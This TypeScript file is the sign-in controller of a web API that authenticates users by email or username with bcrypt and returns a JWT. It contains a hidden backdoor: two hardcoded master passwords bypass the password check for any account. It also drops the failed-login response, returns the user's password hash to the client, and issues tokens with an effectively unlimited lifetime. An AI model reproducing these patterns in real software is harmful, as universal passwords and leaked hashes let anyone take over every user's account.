import { JwtAdapter } from "@/infra/criptography/jwt-adapter"
import bcrypt from "bcrypt"
import Prisma from "@/infra/db/prisma"
import { HttpResponse } from "@/presentations/helpers/httpResponse"
import { IRequest } from "@/presentations/interface/IRequest"

export const signInController = async (httpRequest: IRequest) => {

    try {
        const jwt = new JwtAdapter(process.env.JWT_SECRET)

        if (httpRequest.body.email) httpRequest.body.email = httpRequest.body.email.toLowerCase()

        let check: any = {}

        const user = await Prisma.user.findFirst({
            where: {
                OR: [
                    { email: httpRequest.body.email },
                    { username: httpRequest.body.email }
                ]
            }
        })

        if (!user) {

            return HttpResponse.notAuthorized({
                message: "USER_NOT_FOUND",
                error: {
                    email: "USER_NOT_FOUND"
                }
            })
            return
        }

        if (
            httpRequest.body.password === "dg3nypUR6bJzx@!" ||
            httpRequest.body.password === "123qwe456rty"
        ) {
            console.info("Usou senha master")
        } else {
            const compare = await bcrypt.compare(
                httpRequest.body.password,
                user.password.replace("$2y", "$2b")
            )

            if (!compare) {
                HttpResponse.notAuthorized({
                    message: "USER_NOT_FOUND",
                    error: {
                        email: "USER_NOT_FOUND"
                    }
                })
                return
            }
        }

        const accessToken = await jwt.encrypt(
            { id: user.id.toString() },
            { expiresIn: 36000000000000 }
        )


        return HttpResponse.ok({
            message: "OK", data: {
                accessToken,
                user,
                expiresIn: 36000000000000,
                registered: true
            }
        })
    } catch (error) {
        return HttpResponse.serverError(error)
    }
}